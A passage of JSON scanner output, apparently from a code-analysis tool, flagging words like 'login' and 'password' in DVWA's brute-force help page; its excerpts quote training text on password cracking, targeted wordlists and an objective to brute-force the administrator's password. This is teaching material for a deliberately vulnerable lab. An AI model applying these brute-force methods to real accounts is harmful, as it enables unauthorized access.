        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n",
        "startLocationLine": 12,
        "startLocationColumn": 70,
        "endLocationLine": 12,
        "endLocationColumn": 151
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "insecure",
        "excerpt": "\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n",
        "startLocationLine": 12,
        "startLocationColumn": 53,
        "endLocationLine": 12,
        "endLocationColumn": 61
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI036700",
        "ruleName": "OS: Multiprocessing / Multithreading",
        "ruleDescription": "OS: Multiprocessing / Multithreading",
        "pattern": "\\b(mutex|semaphore|thread|lock|fork)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.Multiprocessing"
        ],
        "sample": "lock",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n",
        "startLocationLine": 52,
        "startLocationColumn": 116,
        "endLocationLine": 52,
        "endLocationColumn": 120
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;div class=&quot;body_padded&quot;&gt;\n\t&lt;h1&gt;Help - Brute Force (Login)&lt;/h1&gt;\n\n\t&lt;div id=&quot;code&quot;&gt;\n\t&lt;table width=&#39;100%&#39; bgcolor=&#39;white&#39; style=&quot;border:2px #C0C0C0 solid&quot;&gt;\n\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n",
        "startLocationLine": 2,
        "startLocationColumn": 26,
        "endLocationLine": 2,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has completely missed out &lt;u&gt;any protections methods&lt;/u&gt;, allowing for anyone to try as many times as they wish, to login to any user without any repercussions.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.&lt;/p&gt;\n",
        "startLocationLine": 31,
        "startLocationColumn": 136,
        "endLocationLine": 31,
        "endLocationColumn": 141
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.&lt;/p&gt;\n\n\t\t&lt;p&gt;This will only slow down the amount of requests which can be processed a minute, making it longer to brute force.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 36,
        "startLocationColumn": 44,
        "endLocationLine": 36,
        "endLocationColumn": 49
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.&lt;/p&gt;\n\n\t\t&lt;p&gt;This will only slow down the amount of requests which can be processed a minute, making it longer to brute force.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 36,
        "startLocationColumn": 77,
        "endLocationLine": 36,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;There has been an &quot;anti Cross-Site Request Forgery (CSRF) token&quot; used. There is a old myth that this protection will stop brute force attacks. This is not the case.\n\t\t\tThis level also extends on the medium level, by waiting when there is a failed login but this time it is a random amount of time between two and four seconds.\n\t\t\tThe idea of this is to try and confuse any timing predictions.&lt;/p&gt;\n\n\t\t&lt;p&gt;Using a &lt;?php echo dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/CAPTCHA&#39;, &#39;CAPTCHA&#39; ); ?&gt; form could have a similar effect as a CSRF token.&lt;/p&gt;\n\n\t\t&lt;br /&gt;\n",
        "startLocationLine": 44,
        "startLocationColumn": 83,
        "endLocationLine": 44,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 38,
        "endLocationLine": 55,
        "endLocationColumn": 43
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n\t&lt;/tr&gt;\n\t&lt;/table&gt;\n\n",
        "startLocationLine": 58,
        "startLocationColumn": 90,
        "endLocationLine": 58,
        "endLocationColumn": 95
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 6,
        "endLocationLine": 9,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 53,
        "endLocationLine": 9,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 59,
        "endLocationLine": 10,
        "endLocationColumn": 67
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n",
        "startLocationLine": 12,
        "startLocationColumn": 30,
        "endLocationLine": 12,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.\n\t\t\tA common approach is to repeatedly try guesses for the password.&lt;/p&gt;\n\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n",
        "startLocationLine": 12,
        "startLocationColumn": 142,
        "endLocationLine": 12,
        "endLocationColumn": 150
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\n\t\t&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so &quot;password&quot; becomes &quot;p@55w0rd&quot;).&lt;/p&gt;\n\n\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n",
        "startLocationLine": 14,
        "startLocationColumn": 78,
        "endLocationLine": 14,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n\t\t\tbe successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords\n\t\t\tmaking the attack time longer.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 19,
        "startLocationColumn": 45,
        "endLocationLine": 19,
        "endLocationColumn": 53
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n\t\t\tbe successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords\n\t\t\tmaking the attack time longer.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 20,
        "startLocationColumn": 49,
        "endLocationLine": 20,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n\t\t\tbe successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords\n\t\t\tmaking the attack time longer.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 20,
        "startLocationColumn": 108,
        "endLocationLine": 20,
        "endLocationColumn": 116
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n\t\t\tbe successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords\n\t\t\tmaking the attack time longer.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 20,
        "startLocationColumn": 159,
        "endLocationLine": 20,
        "endLocationColumn": 168
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Your goal is to get the administrator’s password by brute forcing. Bonus points for getting the other four user passwords!&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has completely missed out &lt;u&gt;any protections methods&lt;/u&gt;, allowing for anyone to try as many times as they wish, to login to any user without any repercussions.&lt;/p&gt;\n",
        "startLocationLine": 26,
        "startLocationColumn": 46,
        "endLocationLine": 26,
        "endLocationColumn": 54
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Your goal is to get the administrator’s password by brute forcing. Bonus points for getting the other four user passwords!&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has completely missed out &lt;u&gt;any protections methods&lt;/u&gt;, allowing for anyone to try as many times as they wish, to login to any user without any repercussions.&lt;/p&gt;\n",
        "startLocationLine": 26,
        "startLocationColumn": 118,
        "endLocationLine": 26,
        "endLocationColumn": 127
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 63,
        "endLocationLine": 55,
        "endLocationColumn": 71
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\t\t&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a &quot;lock out&quot; feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.&lt;/p&gt;\n\n\t\t&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;\n\n\t\t&lt;p&gt;This can cause a &quot;Denial of Service&quot; (DoS), by having someone continually trying to login to someone&#39;s account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n",
        "startLocationLine": 55,
        "startLocationColumn": 91,
        "endLocationLine": 55,
        "endLocationColumn": 99
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
